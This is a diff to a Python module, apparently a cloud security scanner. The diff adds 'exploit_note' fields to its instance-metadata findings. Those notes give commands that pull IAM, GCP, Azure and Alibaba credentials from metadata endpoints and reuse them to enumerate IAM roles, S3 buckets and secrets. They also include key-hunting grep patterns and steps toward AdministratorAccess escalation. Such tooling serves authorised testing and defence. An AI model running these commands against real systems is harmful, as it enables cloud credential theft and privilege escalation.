@@ -594,10 +594,12 @@ def probe(host: str = AWS_HOST, port: int = _DEFAULT_PORT,
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "curl", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
@@ -626,7 +628,12 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 "link-local metadata IPs at the container/network layer; enforce "
                 "IMDSv2-only on every AWS instance; set the IMDS hop-limit to 1 "
                 "so a containerized workload cannot reach the metadata service.",
-                ["CWE-918", "CWE-522", "CWE-732"], kind="web_ssrf_reaches_imds_credentials"))
+                ["CWE-918", "CWE-522", "CWE-732"], kind="web_ssrf_reaches_imds_credentials",
+                exploit_note=(
+                    "Use the captured STS keys immediately: aws sts "
+                    "get-caller-identity ; then map the role's IAM policy "
+                    "and pursue AdministratorAccess / iam:PassRole paths."),
+                depth_tier="t4"))
         return out
 
     if not probe_result.get("reachable"):
@@ -645,7 +652,11 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
             "and hop-limit=1 (AWS), rely on the workload identity model rather "
             "than long-term keys, and treat SSRF against this host as a cloud "
             "credential compromise.",
-            ["CWE-441"], kind="imds_reachable_from_host"))
+            ["CWE-441"], kind="imds_reachable_from_host",
+            exploit_note=(
+                "curl -s http://169.254.169.254/latest/meta-data/  "
+                "# from the runner or a session on the host"),
+            depth_tier="t1"))
         for p in providers:
             out.append(_finding(
                 "info", f"Cloud provider identified: {p}", tgt,
@@ -665,7 +676,11 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 "Set the instance metadata options to HttpTokens=required "
                 "(IMDSv2-only) and HttpPutResponseHopLimit=1. Roll the fleet "
                 "via `aws ec2 modify-instance-metadata-options`.",
-                ["CWE-306", "CWE-668"], kind="imds_v1_enabled"))
+                ["CWE-306", "CWE-668"], kind="imds_v1_enabled",
+                exploit_note=(
+                    "curl -s http://169.254.169.254/latest/meta-data/iam/"
+                    "security-credentials/  # token-free"),
+                depth_tier="t1"))
         creds = aws.get("credentials") or []
         if creds:
             roles = ", ".join(c.get("role", "?") for c in creds)
@@ -682,7 +697,13 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 "Scope the role to the minimum permissions the workload needs; "
                 "enable IMDSv2-only; monitor STS AssumeRole/UseIdentity CloudTrail "
                 "events for unusual source IPs.",
-                ["CWE-522", "CWE-732"], kind="imds_iam_credentials_exposed"))
+                ["CWE-522", "CWE-732"], kind="imds_iam_credentials_exposed",
+                exploit_note=(
+                    "export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... "
+                    "AWS_SESSION_TOKEN=... ; aws sts get-caller-identity ; "
+                    "aws iam list-attached-role-policies --role-name <role> "
+                    "; aws s3 ls ; aws secretsmanager list-secrets"),
+                depth_tier="t3"))
         if aws.get("user_data_secrets"):
             kinds = ", ".join(sorted({s["kind"] for s in aws["user_data_secrets"]}))
             out.append(_finding(
@@ -694,7 +715,12 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 "curl -s http://169.254.169.254/latest/user-data",
                 "Never inject secrets via user-data — use AWS Secrets Manager or "
                 "SSM Parameter Store; rotate any keys already committed.",
-                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets"))
+                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets",
+                exploit_note=(
+                    "grep -Eo 'AKIA[0-9A-Z]{16}|-----BEGIN[^-]+PRIVATE "
+                    "KEY-----' <user-data-dump>  ; then aws sts "
+                    "get-caller-identity with each key"),
+                depth_tier="t3"))
         if aws.get("identity_doc"):
             d = aws["identity_doc"]
             out.append(_finding(
@@ -739,7 +765,13 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 "account; use workload identity federation rather than the default "
                 "compute SA where possible; audit `serviceusage.services.use` and "
                 "cross-project impersonation.",
-                ["CWE-522"], kind="gcp_service_account_token_exposed"))
+                ["CWE-522"], kind="gcp_service_account_token_exposed",
+                exploit_note=(
+                    "curl -H 'Authorization: Bearer <token>' "
+                    "https://cloudresourcemanager.googleapis.com/v1/"
+                    "projects/<project>/getIamPolicy ; gcloud auth "
+                    "activate-service-account --key-file=<key.json>"),
+                depth_tier="t3"))
         if gcp.get("project_id"):
             out.append(_finding(
                 "medium", "GCP project identity disclosed", tgt,
@@ -774,7 +806,12 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 "needs; prefer user-assigned identities scoped per workload; "
                 "audit Azure AD sign-in logs for the identity for anomalous "
                 "resource / IP combinations.",
-                ["CWE-522"], kind="azure_managed_identity_token_exposed"))
+                ["CWE-522"], kind="azure_managed_identity_token_exposed",
+                exploit_note=(
+                    "curl -H 'Authorization: Bearer <arm-token>' "
+                    "https://management.azure.com/subscriptions?api-version="
+                    "2020-01-01 ; az account get-access-token --tenant <sub>"),
+                depth_tier="t3"))
         if az.get("subscription_id"):
             out.append(_finding(
                 "medium", "Azure instance identity disclosed", tgt,
@@ -808,7 +845,13 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 "Scope the RAM role narrowly; monitor STS activity for unusual "
                 "source IPs; consider IMDS access controls provided by ECS "
                 "(EnableIMDSHardenedMode).",
-                ["CWE-522", "CWE-732"], kind="alibaba_ram_credentials_exposed"))
+                ["CWE-522", "CWE-732"], kind="alibaba_ram_credentials_exposed",
+                exploit_note=(
+                    "export ALIBABA_CLOUD_ACCESS_KEY_ID=... "
+                    "ALIBABA_CLOUD_ACCESS_KEY_SECRET=... "
+                    "ALIBABA_CLOUD_SECURITY_TOKEN=... ; "
+                    "aliyun sts GetCallerIdentity"),
+                depth_tier="t3"))
         if ali.get("user_data_secrets"):
             kinds = ", ".join(sorted({s["kind"] for s in ali["user_data_secrets"]}))
             out.append(_finding(
@@ -817,7 +860,12 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 f"{len(ali['user_data_secrets'])} match(es): {kinds}.",
                 "curl -s http://100.100.100.200/latest/user-data",
                 "Never inject secrets via user-data — use Alibaba KMS.",
-                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets"))
+                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets",
+                exploit_note=(
+                    "grep -Eo 'AKIA[0-9A-Z]{16}|-----BEGIN[^-]+PRIVATE "
+                    "KEY-----' <user-data-dump>  ; then aws sts "
+                    "get-caller-identity with each key"),
+                depth_tier="t3"))
 
     do = probe_result.get("digitalocean") or {}
     if do.get("reachable"):
@@ -831,7 +879,12 @@ def findings(probe_result: dict, target_label: str = "imds") -> list[dict]:
                 f"{len(do['user_data_secrets'])} credential-shaped match(es).",
                 "curl -s http://169.254.169.254/metadata/v1.json",
                 "Do not ship secrets in droplet user-data; rotate any exposed.",
-                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets"))
+                ["CWE-798", "CWE-538"], kind="imds_user_data_secrets",
+                exploit_note=(
+                    "grep -Eo 'AKIA[0-9A-Z]{16}|-----BEGIN[^-]+PRIVATE "
+                    "KEY-----' <user-data-dump>  ; then aws sts "
+                    "get-caller-identity with each key"),
+                depth_tier="t3"))
         else:
             out.append(_finding(
                 "medium", "DigitalOcean droplet metadata disclosed", tgt, det,
@@ -865,7 +918,12 @@ def proxy_findings(pr: dict, target_label: str = "imds-via-proxy") -> list[dict]
         "Block link-local (169.254.0.0/16) destinations at the proxy; do not "
         "run an open forward proxy on a cloud VM; use IMDSv2-only + hop-limit=1 "
         "so an intermediary cannot reach the metadata service.",
-        ["CWE-918"], kind="imds_reachable_via_proxy")]
+        ["CWE-918"], kind="imds_reachable_via_proxy",
+        exploit_note=(
+            "curl -x http://<proxy-host>:8080 http://169.254.169.254/"
+            "latest/meta-data/iam/security-credentials/  # if roles listed, "
+            "pull the credential JSON via the same proxy"),
+        depth_tier="t2")]
 
 
 def runbook(host: str = AWS_HOST) -> list[dict]:
